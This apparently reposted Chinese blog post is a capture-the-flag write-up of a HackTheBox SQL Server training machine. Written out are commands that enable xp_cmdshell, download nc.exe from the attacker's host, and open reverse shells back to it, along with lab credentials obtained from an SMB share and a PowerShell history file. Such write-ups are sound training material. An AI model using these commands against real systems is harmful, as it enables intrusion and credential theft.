<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vK4686uJxSh_t3lsCMIkmA)

**0x00 前言**  

最近在打 HackTheBox 起点，第 0 层和第 1 层都是一些比较基础的靶场，没有什么知识盲区

到了第 2 层的时候第一台机器就是 sql server 的靶场，打起来有点卡壳，而且这次学到了不少东西所以在这里就记录一下

**0x01 进入正题**  

刚开始如何连接 VPN 进入到靶场这里就不说了，直接点击开始，创建一个实例

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92d9j0bsJhWl3fWgovXQCMmg2yhGThichiaTXn9DAtDAIHxmm6op6pFSeA/640?wx_fmt=png)

创建成功

**任务 1：哪个 TCP 端口托段数据库服务器？**

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR928pQ62HUtMpDjWBF3lYuYF6ib7f2j6mo3Vvn9qMrgEo0Nm8iazup4pfSQ/640?wx_fmt=png)

首先使用 Nmap 进行扫描

```
nmap -sV -sC -T4 10.129.151.127
```

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92w8d1MC3gJNg38sPaJL8POcCdT1gWpJEHvxMiaWAYcVrVictGME2Y0jZg/640?wx_fmt=png)

很明显 1433 端口开放了 SQL Server 所以任务一的答案是 1433

**任务 2 ：SMB 上可用的非管理共享名称是什么？**

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92ibBEwZ3Kvgx5VKblyYgbnyFTiaXACiaruxdrDZAHq3aTFLRUoSjvY9pUg/640?wx_fmt=png)`` `smbclient -L \\10.129.151.127` ``密码直接空密码，回车即可

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92WSoAu286EuEgkm2TNIyfEsfjyUS97Aic8F4PhnvicF6vBVqDT901BczA/640?wx_fmt=png)

可以看到这里共享了四个目录，非管理共享目录的话就是 backups 了

所以任务 2 的答案是 backups

**任务 3：SMB 共享文件中标识的密码是什么？** ![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92CRVhNnn6qiamjUa7XCaEB1GQe6tVAGWGibdib78z68evkO0jlzG6NQLKg/640?wx_fmt=png)

我们进行连接 backups 目录`` `smbclient \\\\10.129.151.127\\backups` ``

然后使用 get 这个文件下载下来`` `get prod.dtsConfig` ``

再到本地使用 cat 查看，里面有个 Passwordi 字段，那就是这个密码了

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92eB2FWCxXSuG9sg8tZ3iclgPkibX0Cgs7BekPTsZaK4WibrSZrZVhhr5oQ/640?wx_fmt=png)

所以任务 3 答案是 M3g4c0rp123

**任务 4：可以使用 impacket 中的哪些脚本来建立到 Microsoft SQL Server 的经过身份验证的连接？** ![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92nXnDF1HbwzX8uYXGhtrHKZ4XK1aRSgEIjgqibNapmGQsMSicf5WZjs0g/640?wx_fmt=png)

这里考察的我们对 impacket 框架的了解，在 impacket 中哪个脚本可以连接 SQL Server

Gitub.com 搜索 impacket 第一个就是

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92FovpEiaYwxColm2Q7cdhUY9jt095DoYPkcugeOsTvG2CaFOicMxoaAiaQ/640?wx_fmt=png)

使用 git 拉取`` `> git clone https://github.com/SecureAuthCorp/impacket.git  
> cd impacket  
> sudo python3 setup.py install  
> pip3 install -r requirements.txt` ``

安装好依赖之后就可以使用了  

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR923BXzUGB3hNvKp3zHNtsRGvxp5wKwoUrl8UbXJZMGibNDiafeFyyjZHpA/640?wx_fmt=png)

impacket 的脚本都在 examples 里面，看名字就知道 mssql 开头的就是

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92C8DKV3YP9Qw4icecic5e5iaoEkxmtgxzN1d50oj4QVZRYLI1KrVxPESyw/640?wx_fmt=png)

我们这里看一下 mssqlclient.py 脚本的帮助信息，那就是这个脚本了

所以任务 4 的答案就是 mssqlclient.py

**任务 5：可以使用 Microsoft SQL Server 的哪些扩展存储过程来生成 Windows 命令外壳？  
**

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92ZZHdofibia9xSoyfG3p4y2t7EhTib8w7nFtvasxqTUoXOW92zXFVVsPrg/640?wx_fmt=png)

(这里 Google 浏览器翻译有点问题，大致的意思就是 SQL Server 可以用哪个拓展来执行 Windows shell)，SQL Server 的 xp_cmdshell 提权原理这里就不细说了

任务 5 的答案是 xp_cmdshell

**任务 6：可以使用什么脚本来搜索提升 Windows 主机权限的可能路径？**

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92yuGfGcdtCyEEPnKqvCLkWbgCN3mhk6Z54KH6aqE5pVNlC1qpaT8vVA/640?wx_fmt=png)

这里 win 和 Linux 都有一个很好的提权脚本叫 PEAS，Git 下载地址：https://github.com/carlospolop/PEASS-ng/releases/tag/20220710

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92RlFuEvX956TyM5jrNxDgRw4AVBr5ociaJNCcgWB66xBSvhnibomztz3A/640?wx_fmt=png)

Linux 系统叫 linpeas，win 系统叫 winpeas

所以任务 6 答案是 winpeas

**任务 7：哪个文件包含管理员的密码？**

这里就需要我们通过之前 xp_cmdshell 拿到这台机器的 shell

我们使用 impacket 框架中的 mssqlclient.py 脚本进行身份验证

lid 为 ARCHETYPE/sql_svc

l@后面接 IP 地址

l 密码为 M3g4c0rp123

这些信息都是我们从 smb 中的 prod.dtsConfig 文件中得到的

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92TYI8KVpAEvHTOoeEq1XpyZ5gRCQAcaf7F6kDSkia3Nty4lPia3RSsViaQ/640?wx_fmt=png)

连接进 mssql 之后就使用 xp_cmdshell 进行拿 shell`` `SQL> EXEC xp_cmdshell 'whoami'` ``可以看到 xp_cmdshell 没有激活

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92IfKYb2ia36VAiaGHQVLHecFOhCGtIQ5Yomz5Z8IIyYhJFI7icVseSPuEw/640?wx_fmt=png)`` `SQL> SELECT is_srvrolemember('sysadmin');` ``

 ![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92pFzQDHZ9QPtMwY09HczhD3mUX5bbeusAD6hCnZJ9mhr0q7fSVk3wXg/640?wx_fmt=png)

返回为 1 就代表着对于的权限，我们这里为 sysadmin 权限，可以使用 xp_cmdshell 拿 shell

sp_configure 的作用是显示或更改当前服务器的全局配置设置，执行成功返回 0，失败返回 1”`` `SQL> EXECUTE sp_configure 'show advanced options',1;  
SQL> RECONFIGURE;//使前面的配置生效  
SQL> EXECUTE sp_configure 'xp_cmdshell',1;//开启CMDshell  
SQL> RECONFIGURE;//使前面的配置生效` ``

执行完这些语句之后我们就可以执行我们的 xp_cmdshell`` `SQL> xp_cmdshell "whoami"` ``

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92GYmEy4YukS1NBicVy336d9LGg32ZdR4eXVPtRsxicdnNOnAU8lw8Iwyg/640?wx_fmt=png)

当前用户为一个数据库用户，然后使用 nc 将会话弹回来，方便后面的提权操作，现在桌面使用 python 起一个 http 服务

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR922nn709ajortNh4BF3LqksJbYXvabPicd7Y3l5T1K42uvNQ0cfVyLqTw/640?wx_fmt=png)

再利用 xp_cmdshell 调用 powershell 将 nc 下载到目标机器上`` `SQL> xp_cmdshell "powershell.exe wget http://10.10.14.140/nc.exe -O c:\\Users\Public\\nc.exe` ``

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92yQBQqA57icxaDqAH8LSAMkw808otRpuf9NenXAn2TBfE7XxV9IowCUQ/640?wx_fmt=png)

看到这边有个 get 请求之后就是下载成功了，本机使用 nc 进行监听，目标机器使用 nc 将 cmd 反弹到我们机器上`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.140 4444"` ``

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92lOdyma7eelgmPh9Jx7j0cIRPWKm67ApKCdibZCWgOac8jfC6b9iajtKA/640?wx_fmt=png)

因为我这里使用的是新版的 Netcat，没有 -e 参数了

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92yrs553hAXJibUqVmhWqy2Uxet2t6P3YYibzSKCq7ecicYks2jEUYMuqbA/640?wx_fmt=png)

这里使用 nc 串联的方式来弹回 shell`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe 10.10.14.140 4444 | cmd.exe | c:\\Users\Public\\nc.exe 10.10.14.140 3333"` ``

l 在 4444 端口输入命令，会通过管道符，传输到 cmd 解析结果通过管道通过 nc 传输到 3333 端口

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92yeIZ5iazDcksQ05R7D6UAxt6L6H1Ria8jzcKlDtice5EREISlSSDxLt3w/640?wx_fmt=png)

我们在 4444 端口输入命令会通过管道符传输到 cmd.exe，结果通过 nc 传输到 10.10.14.140 3333 端口

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92ASXmkAFlaRXzQPyuIEV4yDXicuAXFIiaUY03VSmR5wg1Gz9uJQ59UXug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR926MQBibuDZG0X1Ku0uhrXoNMGMxyT8vDkkkb5fZSFrA9pRs4Z7lwZb6g/640?wx_fmt=png)

我们这里找到一个 user.txt，但是任务 7 是让我们寻找包含管理员的密码，我们使用 winPEAS 进行提权

https://github.com/carlospolop/PEASS-ng/releases/tag/20220710

在这个里面下载我们对于系统的程序

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR923HuwQEsnWzYNR7YicvibyOEjVSVicX8lN8sFZV5x6MKdOdyuNmkh7BLwQ/640?wx_fmt=png)

这里我下载的是 winPEAS.bat 批处理脚本，因为 exe 程序的输出东西太多了，Kali 终端最上面有一些东西看不到，还是通过上传 nc 一样的方式进行上传 winPEAS.bat(但是这里需要断开 nc 会话，否则下载不了)

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92hmG3armSEmp2XNqvgAcyK4sJw6hwBLcWYjHMj9xTcTxYUvfRicl28bw/640?wx_fmt=png)

成功下载之后我们再连接上 nc`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe 10.10.14.140 4444 | cmd.exe | c:\\Users\Public\\nc.exe 10.10.14.140 3333"` ``

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92Aia9poutw51yOsmOeo0PiaDC1gExSPMIZ5RbdSnic7icgl8znVTog12QzA/640?wx_fmt=png)

cd 到我们下载的目录

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92wgsOGZJOXRmjMr910jJEpKDH5So4ib0wEGrWYVpPN8HaDy9Thh5E1LA/640?wx_fmt=png)

直接.\winPEAS.bat 执行即可，他会自己执行各个功能 我们只需要等待即可

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92dLDTchF0YjAZSQRGr3sDUKGr0PVriaXK9eByiabEvuNVD6fzAjF11pXw/640?wx_fmt=png)

等待片刻之后扫描到一个 console history file

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92VJ8faLajgqVKZIddUAulGvkG75GVnkzEHzpC32rS4n1DPClB0RT5uw/640?wx_fmt=png)

我们使用 type 查看

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR929ibDhXZS3o5yMyY5vSjZACXJk45KLwEScHxE4B71CWaqibQCib5V4KmxQ/640?wx_fmt=png)

是一个历史命令，administrator 用户登录后将共享文件夹 \Archetype\backups 映射到 T 盘，后面是用户名的密码

那么任务 7 的答案就是 ConsoleHost_history.txt 文件中包含管理员的密码

**任务 8：提交 user flag**

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92zB5gCRKLYK9OdY6IClS8hHic7icIrY0x0gtGYl5zOJo3Tv670PmXTFPg/640?wx_fmt=png)

用户标志也就是我们之前在 sql_svc 桌面找到的 user.txt

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR926MQBibuDZG0X1Ku0uhrXoNMGMxyT8vDkkkb5fZSFrA9pRs4Z7lwZb6g/640?wx_fmt=png)

**任务 9：提交 root flag**

我们需要使用 administrator 登录到机器上查看 administrator 的桌面，这里使用 impacket 框架中的 psexec.py 脚本  

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92XyHglplozQ8A7OARNLYSB3RNJ3T1ha0GzOwHhHEaAlUnqyR7gs9EmQ/640?wx_fmt=png)

`` `python3 psexec.py administrator@10.129.151.127` ``

管理员的密码为 MEGACORP_4dm1n!!  

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92hCtLrKxbZRxjiaiaHBzD9Z1FvicD4ep1rd42FldHmxJicAIGGibX5B2ziaVg/640?wx_fmt=png)

成功拿到 system 权限

![](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM237eapuDibpRuXI5XnQWgGR92kstYBz4dCzv22wNQjHvAqTHVic5SfqTl66TdPGqu6IFU3icXIc6SbjQQ/640?wx_fmt=png)

直接查看 Administrator 桌面的 root.txt 成功拿到 root flag

 ![](http://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM236hs7dJicTgNNFNibmibDql9S0fBjPSWkdOWiaGYlLAL8nlK2Xny95AYTew2u2rP9ibl27ibSVnQliaz7UibA/0?wx_fmt=png) ** 巡安似海 ** 巡安似海 — 致力于信息科技研究，不断更新免杀攻防，红蓝对抗，web 安全，内网渗透，漏洞预警。 36 篇原创内容  公众号

**往期推荐 ●●**

**// 1**

｜ [外网艰难打点到 Linux 提权](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484954&idx=1&sn=a565e04e5bf100a79c1591fbce5f4be2&chksm=c1b3c1f9f6c448ef352fd18b95edaf71d3441ac2eda4363e4127e3e71ef068769201b104e285&scene=21#wechat_redirect)

**// 2**

｜ [Yii2 反序列化远程代码执行 POP 链](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484882&idx=1&sn=aafebdf09ff458b4732e59d05388f17a&chksm=c1b3c231f6c44b27d8ad8ef1ecdd5ca55c3e3eaad65efe7793393be308436672941a8b369b08&scene=21#wechat_redirect)  

**// 3**

｜[【PyHacker 编写指南】爆破一句话密码](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247483885&idx=1&sn=4b7e846e545ee45c93d2e855088d0f09&chksm=c1b3c60ef6c44f1830f36d9684b088121154d3155e7209209e57c18b41176102391055c7bd42&scene=21#wechat_redirect)

**// 4**

｜ [](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247483719&idx=1&sn=e125bde3160e13707a000e0e99e3acee&chksm=c1b3c6a4f6c44fb254607f62bd526273e480bf2dd2b91c91400cfdc4e8d4dd4f9a02ab6bef68&scene=21#wechat_redirect) [利用云函数隐藏 Webshell 真实 IP](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484790&idx=1&sn=e7cd8b845203a5188fb4bbe5811d2590&chksm=c1b3c295f6c44b830c557b1030a5cef74a37bbbd57b54fc75c92766c3ee0fb2a9bd9d0e83e37&scene=21#wechat_redirect)